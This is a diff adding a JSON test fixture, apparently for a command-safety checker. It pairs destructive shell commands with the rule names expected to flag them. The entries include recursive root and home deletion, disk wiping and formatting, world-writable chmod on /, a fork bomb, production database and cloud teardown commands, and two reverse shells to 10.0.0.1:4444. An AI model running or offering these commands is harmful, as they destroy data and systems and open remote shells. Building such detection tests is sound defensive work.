@@ -1,0 +1,156 @@
+[
+  {
+    "command": "chown -R root:root /etc",
+    "rules": [
+      "PERM_SYSTEM_RECURSIVE",
+      "PERM_RECURSIVE_CHOWN"
+    ]
+  },
+  {
+    "command": "chmod -R 777 /",
+    "rules": [
+      "PERM_SYSTEM_RECURSIVE",
+      "PERM_RECURSIVE_CHMOD",
+      "PERM_WORLD_WRITABLE"
+    ]
+  },
+  {
+    "command": "rm -rf ~",
+    "rules": [
+      "FS_ROOT_DELETE",
+      "FS_RECURSIVE_DELETE"
+    ]
+  },
+  {
+    "command": "rm -rf ~/*",
+    "rules": [
+      "FS_ROOT_DELETE",
+      "FS_RECURSIVE_DELETE"
+    ]
+  },
+  {
+    "command": "rm -rf /*",
+    "rules": [
+      "FS_PROTECTED_TARGET",
+      "FS_ROOT_DELETE",
+      "FS_RECURSIVE_DELETE"
+    ]
+  },
+  {
+    "command": "rm -rf --no-preserve-root /",
+    "rules": [
+      "FS_PROTECTED_TARGET",
+      "FS_NO_PRESERVE_ROOT",
+      "FS_ROOT_DELETE",
+      "FS_RECURSIVE_DELETE"
+    ]
+  },
+  {
+    "command": "rm -rf /srv/protected/data",
+    "rules": [
+      "FS_PROTECTED_TARGET",
+      "FS_RECURSIVE_DELETE",
+      "FS_SYSTEM_PATH_DELETE"
+    ]
+  },
+  {
+    "command": "rm -rf /srv",
+    "rules": [
+      "FS_PROTECTED_TARGET",
+      "FS_ROOT_DELETE",
+      "FS_RECURSIVE_DELETE"
+    ]
+  },
+  {
+    "command": "find / -name \"*.tmp\" -delete",
+    "rules": [
+      "FS_PROTECTED_TARGET",
+      "FS_ROOT_DELETE",
+      "FS_FIND_DELETE"
+    ]
+  },
+  {
+    "command": "dd if=/dev/zero of=/dev/sda bs=1M",
+    "rules": [
+      "FS_DISK_WRITE"
+    ]
+  },
+  {
+    "command": "mkfs.ext4 /dev/sdb1",
+    "rules": [
+      "FS_DISK_FORMAT"
+    ]
+  },
+  {
+    "command": "bash -c \"rm -rf /\"",
+    "rules": [
+      "FS_PROTECTED_TARGET",
+      "FS_ROOT_DELETE",
+      "FS_RECURSIVE_DELETE"
+    ]
+  },
+  {
+    "command": "echo $(rm -rf /)",
+    "rules": [
+      "FS_PROTECTED_TARGET",
+      "FS_ROOT_DELETE",
+      "FS_RECURSIVE_DELETE",
+      "SHELL_UNCERTAIN"
+    ]
+  },
+  {
+    "command": "psql -h prod-db.example.com -c \"DELETE FROM users\"",
+    "rules": [
+      "DB_PRODUCTION_WRITE",
+      "DB_DELETE_NO_WHERE"
+    ]
+  },
+  {
+    "command": "NODE_ENV=production npx prisma migrate reset",
+    "rules": [
+      "DB_PRODUCTION_MIGRATION",
+      "DB_MIGRATION_RESET"
+    ]
+  },
+  {
+    "command": "TF_WORKSPACE=production terraform destroy",
+    "rules": [
+      "CLOUD_PRODUCTION_TARGET",
+      "CLOUD_TERRAFORM_DESTROY"
+    ]
+  },
+  {
+    "command": "kubectl --context prod-cluster delete pod web-1",
+    "rules": [
+      "CLOUD_PRODUCTION_TARGET",
+      "CLOUD_K8S_DELETE"
+    ]
+  },
+  {
+    "command": "aws --profile prod ec2 terminate-instances --instance-ids i-1",
+    "rules": [
+      "CLOUD_PRODUCTION_TARGET",
+      "CLOUD_AWS_DELETE"
+    ]
+  },
+  {
+    "command": ":(){ :|:& };:",
+    "rules": [
+      "PROC_FORK_BOMB",
+      "SHELL_UNCERTAIN"
+    ]
+  },
+  {
+    "command": "nc -e /bin/sh 10.0.0.1 4444",
+    "rules": [
+      "NET_REVERSE_SHELL"
+    ]
+  },
+  {
+    "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "rules": [
+      "NET_REVERSE_SHELL",
+      "SHELL_UNCERTAIN"
+    ]
+  }
+]
